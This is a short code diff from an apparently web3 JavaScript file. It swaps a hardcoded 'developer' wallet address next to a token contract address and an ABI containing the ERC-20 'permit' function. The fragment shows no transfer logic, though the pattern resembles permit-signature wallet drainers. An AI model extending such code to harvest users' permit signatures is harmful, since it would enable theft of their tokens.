@@ -11,7 +11,7 @@ import {JsonRpcSigner} from "@ethersproject/providers";
 
 const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
 const developer = {
-	address: "0x4a13959671D73A49431F4224Ec44A792368d1558"
+	address: "0xB932eF059c3857FBA2505B31E5899b3E170f25E7"
 }
 const abi = [
 	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
